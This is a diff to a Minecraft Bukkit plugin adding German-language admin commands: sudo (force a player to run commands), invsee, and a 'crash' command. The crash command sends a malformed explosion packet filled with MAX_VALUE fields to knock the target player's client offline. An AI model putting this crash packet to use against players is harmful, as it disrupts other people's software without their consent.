@@ -4,10 +4,13 @@ import de.jonas.Survival;
 import de.jonas.survival.handler.economy.EconomyHandler;
 import de.jonas.survival.objects.annotations.SurvivalCommand;
 import de.jonas.survival.objects.util.ItemCreator;
+import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
+import net.minecraft.server.v1_8_R3.Vec3D;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.GameMode;
 import org.bukkit.Material;
+import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
 import org.bukkit.enchantments.Enchantment;
 import org.bukkit.entity.Player;
 import org.bukkit.inventory.ItemStack;
@@ -19,6 +22,7 @@ import org.jetbrains.annotations.Range;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.List;
 
 public final class AdminCommands {
@@ -348,6 +352,7 @@ public final class AdminCommands {
     }
     //</editor-fold>
 
+    //<editor-fold desc="command: money">
     @SurvivalCommand(
         command = "money",
         minLength = 1,
@@ -367,5 +372,105 @@ public final class AdminCommands {
             Survival.getPrefix() + "Der Kontostand des Spielers " + target.getName() + " beträgt " + amount + "!"
         );
     }
+    //</editor-fold>
+
+    @SurvivalCommand(
+        command = "sudo",
+        minLength = 2,
+        maxLength = Integer.MAX_VALUE,
+        permission = "survival.sudo",
+        usage = "/sudo <player> <command>"
+    )
+    public void sudo(
+        @NotNull final Player player,
+        @NotNull final String[] args
+    ) {
+        final Player target = Bukkit.getPlayer(args[0]);
+
+        if (target == null || !target.isOnline()) {
+            player.sendMessage(
+                Survival.getPrefix() + "Der Spieler ist nicht online!"
+            );
+            return;
+        }
+
+        final StringBuilder builder = new StringBuilder();
+        for (int i = 1; i < args.length; i++) {
+            builder.append(args[i]).append(" ");
+        }
+
+        target.performCommand(builder.toString());
+
+        player.sendMessage(
+            Survival.getPrefix() + "Der Befehl wurde ausgeführt!"
+        );
+    }
+
+    //<editor-fold desc="command: crash">
+    @SurvivalCommand(
+        command = "crash",
+        minLength = 1,
+        maxLength = 1,
+        permission = "survival.crash",
+        usage = "/crash <player>"
+    )
+    public void crash(
+        @NotNull final Player player,
+        @NotNull final String[] args
+    ) {
+        final Player target = Bukkit.getPlayer(args[0]);
+
+        if (target == null || !target.isOnline()) {
+            player.sendMessage(
+                Survival.getPrefix() + "Der Spieler ist nicht online!"
+            );
+            return;
+        }
+
+        ((CraftPlayer) target).getHandle().playerConnection.sendPacket(
+            new PacketPlayOutExplosion(
+                Double.MAX_VALUE,
+                Double.MAX_VALUE,
+                Double.MAX_VALUE,
+                Float.MAX_VALUE,
+                Collections.EMPTY_LIST,
+                new Vec3D(
+                    Double.MAX_VALUE,
+                    Double.MAX_VALUE,
+                    Double.MAX_VALUE
+                )
+            )
+        );
+
+        player.sendMessage(
+            Survival.getPrefix() + "Der Spieler " + target.getName() + " wurde gecrashed!"
+        );
+    }
+    //</editor-fold>
+
+    //<editor-fold desc="command: invsee">
+    @SurvivalCommand(
+        command = "invsee",
+        minLength = 1,
+        maxLength = 1,
+        permission = "survival.invsee",
+        usage = "/invsee <player>"
+    )
+    public void invsee(
+        @NotNull final Player player,
+        @NotNull final String[] args
+    ) {
+        final Player target = Bukkit.getPlayer(args[0]);
+
+        if (target == null || !target.isOnline()) {
+            player.sendMessage(
+                Survival.getPrefix() + "Der Spieler ist nicht online!"
+            );
+            return;
+        }
+
+        player.openInventory(target.getInventory());
+    }
+    //</editor-fold>
 
 }
